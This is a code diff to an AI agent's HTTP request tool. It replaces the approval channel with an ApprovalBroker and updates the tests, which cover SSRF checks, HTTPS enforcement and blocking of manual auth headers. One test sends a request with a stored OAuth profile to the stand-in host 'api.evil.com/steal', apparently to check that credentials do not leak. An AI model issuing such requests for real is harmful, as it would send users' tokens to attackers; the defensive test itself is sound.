@@ -12,6 +12,7 @@ use crate::tools::command_risk::{PermissionMode, RiskLevel};
 use crate::tools::sanitize::{sanitize_external_content, sanitize_output, wrap_untrusted_output};
 use crate::tools::terminal::ApprovalRequest;
 use crate::tools::web_fetch::validate_url_for_ssrf;
+use crate::tools::ApprovalBroker;
 use crate::traits::{
     Tool, ToolCallMetadata, ToolCallOutcome, ToolCallSemantics, ToolCapabilities,
     ToolTargetHintKind, ToolVerificationMode,
@@ -38,7 +39,7 @@ const MAX_TIMEOUT_SECS: u64 = 120;
 
 pub struct HttpRequestTool {
     profiles: Arc<RwLock<HashMap<String, HttpAuthProfile>>>,
-    approval_tx: mpsc::Sender<ApprovalRequest>,
+    approval_tx: ApprovalBroker,
     session_approvals: Arc<RwLock<HashMap<String, HashSet<String>>>>,
     oauth_gateway: Arc<RwLock<Option<crate::oauth::OAuthGateway>>>,
 }
@@ -46,7 +47,7 @@ pub struct HttpRequestTool {
 impl HttpRequestTool {
     pub fn new(
         profiles: Arc<RwLock<HashMap<String, HttpAuthProfile>>>,
-        approval_tx: mpsc::Sender<ApprovalRequest>,
+        approval_tx: ApprovalBroker,
     ) -> Self {
         Self {
             profiles,
@@ -1640,7 +1641,10 @@ mod tests {
     #[test]
     fn test_schema_has_required_fields() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let schema = tool.schema();
         assert_eq!(schema["name"], "http_request");
         assert!(schema["description"].as_str().unwrap().len() > 10);
@@ -1973,7 +1977,10 @@ mod tests {
     #[tokio::test]
     async fn test_session_approval_scope_ignores_query_and_body_values() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let first_url = reqwest::Url::parse("https://api.twitter.com/2/tweets?text=first").unwrap();
         let second_url =
             reqwest::Url::parse("https://api.twitter.com/2/tweets?text=second").unwrap();
@@ -2107,7 +2114,10 @@ mod tests {
     #[tokio::test]
     async fn test_https_enforcement() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let result = tool
             .call(r#"{"method": "GET", "url": "http://example.com/api"}"#)
             .await
@@ -2120,7 +2130,7 @@ mod tests {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
         let mut profiles = HashMap::new();
         profiles.insert("twitter".to_string(), make_oauth_profile());
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(profiles)), tx);
+        let tool = HttpRequestTool::new(Arc::new(RwLock::new(profiles)), ApprovalBroker::new(tx));
         let result = tool
             .call(
                 r#"{"method": "GET", "url": "https://api.evil.com/steal", "auth_profile": "twitter"}"#,
@@ -2133,7 +2143,10 @@ mod tests {
     #[tokio::test]
     async fn test_manual_authorization_header_is_blocked() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let result = tool
             .call(
                 r#"{
@@ -2153,7 +2166,10 @@ mod tests {
     #[tokio::test]
     async fn test_embedded_tool_params_are_recovered_before_profile_resolution() {
         let (tx, mut rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let err = tool
             .call(
                 r#"{
@@ -2176,7 +2192,10 @@ mod tests {
     #[tokio::test]
     async fn test_manual_api_key_header_is_blocked() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let result = tool
             .call(
                 r#"{
@@ -2196,7 +2215,10 @@ mod tests {
     #[tokio::test]
     async fn test_non_auth_headers_are_not_blocked_by_manual_auth_guard() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let result = tool
             .call(
                 r#"{
@@ -2215,7 +2237,10 @@ mod tests {
     #[tokio::test]
     async fn test_unknown_auth_profile() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let result = tool
             .call(
                 r#"{"method": "GET", "url": "https://api.example.com/test", "auth_profile": "nonexistent"}"#,
@@ -2231,7 +2256,10 @@ mod tests {
     #[tokio::test]
     async fn call_with_status_outcome_returns_none_for_validation_failure() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
-        let tool = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx);
+        let tool = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx),
+        );
         let outcome = tool
             .call_with_status_outcome(
                 r#"{"method": "GET", "url": "http://example.com/api"}"#,
@@ -2246,9 +2274,15 @@ mod tests {
     #[tokio::test]
     async fn call_and_call_with_status_outcome_produce_same_output() {
         let (tx1, _rx1) = tokio::sync::mpsc::channel(1);
-        let tool1 = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx1);
+        let tool1 = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx1),
+        );
         let (tx2, _rx2) = tokio::sync::mpsc::channel(1);
-        let tool2 = HttpRequestTool::new(Arc::new(RwLock::new(HashMap::new())), tx2);
+        let tool2 = HttpRequestTool::new(
+            Arc::new(RwLock::new(HashMap::new())),
+            ApprovalBroker::new(tx2),
+        );
 
         let args = r#"{"method": "GET", "url": "http://example.com/api"}"#;
         let call_result = tool1.call(args).await.unwrap();
